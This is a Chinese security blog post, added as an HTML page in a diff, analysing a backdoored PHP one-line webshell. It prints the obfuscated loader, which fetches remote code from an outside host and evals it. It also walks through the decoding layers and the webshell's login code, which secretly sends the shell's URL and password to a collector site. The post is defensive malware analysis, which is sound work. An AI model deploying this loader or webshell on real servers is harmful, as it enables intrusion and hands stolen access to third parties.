@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>一次一句话木马解密</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <p>本文记录一下一句话木马解密的过程</p>
+<ul>
+<li>目录
+{:toc}</li>
+</ul>
+<h2 id="0x00-背景">0x00 背景</h2>
+<p>同事发来了一个一句话木马如下，据说有箱子</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#a6e22e">set_time_limit</span>(<span style="color:#ae81ff">666</span>);
+$i <span style="color:#f92672">=</span> <span style="color:#a6e22e">range</span>(<span style="color:#a6e22e">‘</span><span style="color:#f92672">~</span><span style="color:#a6e22e">’</span>,<span style="color:#a6e22e">’</span><span style="color:#f92672">.</span><span style="color:#a6e22e">’</span>);
+<span style="color:#a6e22e">s</span>($i[<span style="color:#ae81ff">27</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">22</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">12</span>],
+$i[<span style="color:#ae81ff">22</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">10</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">10</span>]
+<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">14</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">68</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">79</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">79</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">7</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">7</span>]
+<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">7</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">80</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">14</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">22</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">14</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">11</span>]
+<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">25</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">27</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">80</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">27</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">27</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">79</span>]
+<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">29</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">26</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">17</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">21</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">16</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">80</span>]
+<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">23</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">21</span>]<span style="color:#f92672">.</span>$i[<span style="color:#ae81ff">24</span>]);
+<span style="color:#a6e22e">session_start</span>();
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">s</span>($c,$url){
+<span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($_SESSION[<span style="color:#a6e22e">‘PhpCode’</span>])){
+	$_SESSION[<span style="color:#a6e22e">‘PhpCode’</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">file_get_contents</span>($url);
+	<span style="color:#a6e22e">m</span>($_SESSION[<span style="color:#a6e22e">‘PhpCode’</span>],$c);
+	}		
+}
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">m</span>($a,$c){
+	$unzip<span style="color:#f92672">=</span>$c(<span style="color:#ae81ff">103</span>)<span style="color:#f92672">.</span>$c(<span style="color:#ae81ff">122</span>)<span style="color:#f92672">.</span>$c(<span style="color:#ae81ff">105</span>)<span style="color:#f92672">.</span>$c(<span style="color:#ae81ff">110</span>);
+	$unzip<span style="color:#f92672">.=</span>$c(<span style="color:#ae81ff">102</span>)<span style="color:#f92672">.</span>$c(<span style="color:#ae81ff">108</span>)<span style="color:#f92672">.</span>$c(<span style="color:#ae81ff">97</span>)<span style="color:#f92672">.</span>$c(<span style="color:#ae81ff">116</span>)<span style="color:#f92672">.</span>$c(<span style="color:#ae81ff">101</span>);
+	$ss <span style="color:#f92672">=</span> <span style="color:#a6e22e">“”</span>;
+	<span style="color:#a6e22e">l</span>($unzip($a),$ss);
+}
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">l</span>($xx,$ss){
+	$password <span style="color:#f92672">=</span> <span style="color:#a6e22e">“admin”</span>;
+	$MyName   <span style="color:#f92672">=</span> <span style="color:#a6e22e">“Admin”</span>;
+	<span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($xx<span style="color:#f92672">.</span>$ss);
+}
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><h2 id="0x01-一句话木马分析">0x01 一句话木马分析</h2>
+<p><code>$_SESSION[‘PhpCode’]=file_get_contents($url);</code> 可以看到是将一个远程文件内容写入<code>$_SESSION['PhpCode']</code></p>
+<p>直接将<code>$url</code>输出，获得远程文件地址 : <code>http://www.phpsec.cc/admin.gif</code></p>
+<p>将木马下载到本地：</p>
+<pre><code>➜  test wget http://www.phpsec.cc/admin.gif -O admin.php
+--2018-06-21 21:54:57--  http://www.phpsec.cc/admin.gif
+Resolving www.phpsec.cc... 103.40.162.128
+Connecting to www.phpsec.cc|103.40.162.128|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 73640 (72K) [image/gif]
+Saving to: ‘admin.php’
+
+admin.php           100%[===================&gt;]  71.91K   363KB/s    in 0.2s    
+
+2018-06-21 21:54:57 (363 KB/s) - ‘admin.php’ saved [73640/73640]
+</code></pre><pre><code>➜  test cat admin.php 
+\?ǎ?L???/???4M?0????(`@+zO???7??,f?T?R???y?
+	..... 省略
+</code></pre><p>发现是一个乱码，回到一句话木马，发现是将文件读取回来后，调用了<code>$unzip</code>，通过如下代码还原出函数名：</p>
+<pre><code>$unzip=$c(103).$c(122).$c(105).$c(110);
+$unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);
+echo $unzip;die;
+</code></pre><p>获得<code>gzinflate</code>函数，如此一来，我们的思路更加清晰</p>
+<h2 id="0x02-webshell的解密">0x02 Webshell的解密</h2>
+<p>由于这个一句话木马是获取远程文件，然后通过<code>gzinflate</code>解密出来，故此也可以直接将<code>gzinflate</code>的执行结果输出到另外一个文件。</p>
+<p><code>➜  test php 1.php &gt; 2.php</code></p>
+<p>由于<code>2.php</code>文件有点大，省略中间部分：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+$Windows <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pr&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;g_&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;re&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;p&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;l&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;ace&#34;</span>;
+$Windows(<span style="color:#e6db74">&#34;/.*/e&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28</span><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">eJzs/Wl7G9eVLgx/Vq4r/6GMsAMiAcmagRJFRoWqgi1Hk0XJTmy5+YAASMIiARgANUTSe9ndcWIncew+mRN3hm6nkz7dHnJ6iMfkxxyBkj+dv/De995VhSpMBCVLcrqbtkigas977TWvteudTquz3qm3W51eo7k1H6wH586dOafcUIL1s+65tSC3fLxb7633Grv19Z3GbqM3r+aWP/+57XqlVu/MZ6qtZq/e7C2cv9auH1V69au9pe3e7s6yUt2udFBxZWtDNzQ9wzrj2vn85zb3mtVeo9VUzrVavfVHz87PVTqdyrXc5
+</span><span style="color:#e6db74">..........
+</span><span style="color:#e6db74">..........
+</span><span style="color:#e6db74">qnZ7LO2iPjdBXPHX+87Tr213m4/8EAM3J45MtNEgSGv+bB+Lug8jJC5vFknnDcg9zpygQDpeVD8kieBcGcaHiHb57f7wUWavCnlAV0e76a4Rfp8ZvvbffaVGbB2Q5k/7NENHAWdOT50vdG2PWjhUvgP3bZsADYmE7l9XkDC3G7cnMyEKJG75x9BZ5aRHZQQv4LGP+jJHqBhZntbkSYWCxOMTLfM3v8P0Vk1MQ==
+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x29\x29\x29\x3B</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;.&#34;</span>);
+
+</code></pre></div><p>第二行可以看到是一个函数名<code>preg_replace</code>，然后通过调用函数，第一个参数携带了<code>/.*/e</code>，代表将所有的内容当做代码执行。</p>
+<p>目前先要将第二个参数的十六进制字符解密出来，使用Python：</p>
+<pre><code>➜  test python
+Python 2.7.15 (default, May  1 2018, 16:44:37) 
+[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.39.2)] on darwin
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; s=&quot;\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28&quot;
+&gt;&gt;&gt; s
+'eval(gzuncompress(base64_decode('
+&gt;&gt;&gt; s=&quot;\x29\x29\x29\x3B&quot;
+&gt;&gt;&gt; s
+')));'
+&gt;&gt;&gt; exit()
+</code></pre><p>很明显当前这个Webshell是通过典型的<code>base64_decode</code>，然后交给<code>gzuncompress</code>，思路很是奇特 :)</p>
+<p>解密方法就是只需要将eval（\x65\x76\x61\x6C）改成print_r（\x70\x72\x69\x6e\x74\x5f\x72）即可。</p>
+<pre><code>➜  test php 2.php &gt; 3.php
+</code></pre><h2 id="0x03-webshell分析">0x03 Webshell分析</h2>
+<p>在 5228 行左右：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">....</span>
+
+<span style="color:#66d9ef">if</span>($_COOKIE[<span style="color:#e6db74">&#39;admin_envlpass&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#a6e22e">md5</span>($password))
+{
+	<span style="color:#a6e22e">ob_start</span>();
+	$MSG_TOP <span style="color:#f92672">=</span> $MyName;
+	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;envlpass&#39;</span>]))
+	{
+
+		$cookietime <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>() <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3600</span>;
+		<span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;admin_envlpass&#39;</span>,<span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;envlpass&#39;</span>]),$cookietime);
+		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;envlpass&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#a6e22e">md5</span>($password)){<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($serveru,<span style="color:#e6db74">&#34;0.0&#34;</span>)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">strpos</span>($serveru,<span style="color:#e6db74">&#34;192.168.&#34;</span>)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">strpos</span>($serveru,<span style="color:#e6db74">&#34;localhost&#34;</span>)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">or</span> ($serveru<span style="color:#f92672">==</span>$_COOKIE[<span style="color:#e6db74">&#39;serveru&#39;</span>] <span style="color:#66d9ef">and</span> $serverp<span style="color:#f92672">==</span>$_COOKIE[<span style="color:#e6db74">&#39;serverp&#39;</span>])) {<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;&lt;meta http-equiv=&#39;refresh&#39; content=&#39;0;URL=?&#39;&gt;&#34;</span>);} <span style="color:#66d9ef">else</span> {<span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;serveru&#39;</span>,$serveru);<span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;serverp&#39;</span>,$serverp);<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;&lt;meta http-equiv=&#39;refresh&#39; content=&#39;0;URL=?&#39;&gt;&lt;script src=&#39;?s=get&#39;&gt;&lt;/script&gt;&#34;</span>);}}
+		<span style="color:#66d9ef">else</span>{$MSG_TOP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;PASS IS FALSE&#39;</span><span style="color:#f92672">.</span>$password;}
+	}
+	<span style="color:#a6e22e">print_r</span>($GLOBALS);<span style="color:#66d9ef">die</span>;
+	<span style="color:#a6e22e">Root_Login</span>($MSG_TOP);
+	<span style="color:#a6e22e">ob_end_flush</span>();
+	<span style="color:#66d9ef">exit</span>;
+}
+<span style="color:#f92672">....</span>
+</code></pre></div><p>直接将<code>$GLOBALS</code>打印出来，结果如下：</p>
+<pre><code>Array ( [_GET] =&gt; Array ( ) [_POST] =&gt; Array ( [envlpass] =&gt; www ) [_COOKIE] =&gt; Array ( [bdshare_firstime] =&gt; 1518158774124 [admin_envlpass] =&gt; 4eae35f1b35977a00ebd8086c259d4c9 ) [_FILES] =&gt; Array ( ) [_SERVER] =&gt; Array ( [USER] =&gt; nobody [HOME] =&gt; /var/empty [FCGI_ROLE] =&gt; RESPONDER [SCRIPT_FILENAME] =&gt; /usr/local/var/www/a.php [QUERY_STRING] =&gt; [REQUEST_METHOD] =&gt; POST [CONTENT_TYPE] =&gt; application/x-www-form-urlencoded [CONTENT_LENGTH] =&gt; 12 [SCRIPT_NAME] =&gt; /a.php [REQUEST_URI] =&gt; /a.php? [DOCUMENT_URI] =&gt; /a.php [DOCUMENT_ROOT] =&gt; /usr/local/var/www [SERVER_PROTOCOL] =&gt; HTTP/1.1 [REQUEST_SCHEME] =&gt; http [GATEWAY_INTERFACE] =&gt; CGI/1.1 [SERVER_SOFTWARE] =&gt; nginx/1.12.2 [REMOTE_ADDR] =&gt; 127.0.0.1 [REMOTE_PORT] =&gt; 51387 [SERVER_ADDR] =&gt; 127.0.0.1 [SERVER_PORT] =&gt; 8080 [SERVER_NAME] =&gt; localhost [REDIRECT_STATUS] =&gt; 200 [HTTP_HOST] =&gt; 127.0.0.1:8080 [HTTP_USER_AGENT] =&gt; Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 [HTTP_ACCEPT] =&gt; text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 [HTTP_ACCEPT_LANGUAGE] =&gt; zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 [HTTP_ACCEPT_ENCODING] =&gt; gzip, deflate [HTTP_REFERER] =&gt; http://127.0.0.1:8080/a.php? [HTTP_COOKIE] =&gt; bdshare_firstime=1518158774124; admin_envlpass=4eae35f1b35977a00ebd8086c259d4c9 [HTTP_X_FORWARDED_FOR] =&gt; 10.74.183.12 [HTTP_CONNECTION] =&gt; keep-alive [HTTP_UPGRADE_INSECURE_REQUESTS] =&gt; 1 [HTTP_CACHE_CONTROL] =&gt; max-age=0 [HTTP_CONTENT_TYPE] =&gt; application/x-www-form-urlencoded [HTTP_CONTENT_LENGTH] =&gt; 12 [PHP_SELF] =&gt; /a.php [REQUEST_TIME_FLOAT] =&gt; 1529592983.5677 [REQUEST_TIME] =&gt; 1529592983 [argv] =&gt; Array ( ) [argc] =&gt; 0 ) [GLOBALS] =&gt; Array *RECURSION* [pgrow] =&gt; www [numeric] =&gt; [pgaction] =&gt; 127.0.0.1:8080/a.php [html] =&gt;
+&quot;
+68,67,102,8775,113,47,78
+85,110,106,53,80,65,10668,109,89,119,65,122,89
+9979,75,76,102,107
+74,77,98,65,5189,105,98,81,112,48. 6985110
+[i] =&gt; 713 [pgresult] =&gt; http://shellapi.cc/404.php?url=127.0.0.1:8080/a.php&amp;pass=www [pgq] =&gt; aHR0cDovL3NoZWxsYXBpLmNjLzQwNC5waHA/dXJsPQ== [MSG_TOP] =&gt; PASS IS FALSE [cookietime] =&gt; 1529679383 ) 
+</code></pre><p>可以很明显的找到箱子地址<code>shellapi.cc</code></p>
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
